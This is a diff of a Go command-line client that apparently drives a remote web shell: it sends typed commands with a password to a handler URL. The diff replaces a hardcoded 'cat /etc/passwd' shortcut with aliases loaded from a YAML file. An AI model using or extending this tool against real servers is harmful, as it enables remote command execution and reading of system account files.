@@ -6,7 +6,7 @@ import (
 	"encoding/base64"
 	"flag"
 	"fmt"
-	"io/ioutil"
+	"io"
 	"log"
 	"math/rand"
 	"net/http"
@@ -14,8 +14,11 @@ import (
 	"os"
 	"strings"
 	"text/template"
-	"time"
+
+	"gopkg.in/yaml.v3"
 )
+
+type CustomCommands map[string]string
 
 type Rand struct {
 	RandVar  string
@@ -23,12 +26,10 @@ type Rand struct {
 }
 
 func RandString(n int) string {
-	rand.Seed(time.Now().UnixNano())
 	const alphanum = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 	var bytes = make([]byte, n)
-	rand.Read(bytes)
-	for i, b := range bytes {
-		bytes[i] = alphanum[b%byte(len(alphanum))]
+	for i := range bytes {
+		bytes[i] = alphanum[rand.Intn(len(alphanum))]
 	}
 	return string(bytes)
 }
@@ -68,7 +69,7 @@ func Requester(url string, cmd string, password string) string {
 	}
 	defer resp.Body.Close()
 
-	bodyText, err := ioutil.ReadAll(resp.Body)
+	bodyText, err := io.ReadAll(resp.Body)
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -78,14 +79,27 @@ func Requester(url string, cmd string, password string) string {
 	return string(bodyText)
 }
 
-func checkCustom(cmd string) string {
+func readCustomCommands(filename string) (CustomCommands, error) {
+	var commands CustomCommands
+	yamlFile, err := os.ReadFile(filename)
+	if err != nil {
+		return nil, err
+	}
+	err = yaml.Unmarshal(yamlFile, &commands)
+	if err != nil {
+		return nil, err
+	}
+	return commands, nil
+}
+
+func checkCustom(cmd string, customCommands CustomCommands) string {
 	if cmd == ":\n" || cmd == ":exit\n" {
 		os.Exit(0)
 	} else if cmd == ":cls\n" || cmd == ":clear\n" {
 		fmt.Printf("\x1bc")
-		cmd = ""
-	} else if cmd == ":passwd\n" {
-		cmd = "cat /etc/passwd"
+		return ""
+	} else if custom, ok := customCommands[cmd]; ok {
+		return custom
 	}
 	return cmd
 }
@@ -97,6 +111,12 @@ func main() {
 	raw := flag.Bool("raw", false, "a boolean")
 	flag.Parse()
 
+	customCommands, err := readCustomCommands("custom_commands.yaml")
+	if err != nil {
+		fmt.Println("Error loading custom commands:", err)
+		os.Exit(1)
+	}
+
 	if *handler != "" {
 		var password string
 		fmt.Printf("🔑 Password > ")
@@ -106,7 +126,7 @@ func main() {
 			fmt.Printf("🥷 > ")
 			in := bufio.NewReader(os.Stdin)
 			cmd, _ := in.ReadString('\n')
-			cmd = checkCustom(cmd)
+			cmd = checkCustom(cmd, customCommands)
 			if cmd != "" {
 				resp := Requester(*handler, cmd, password)
 				println(resp)
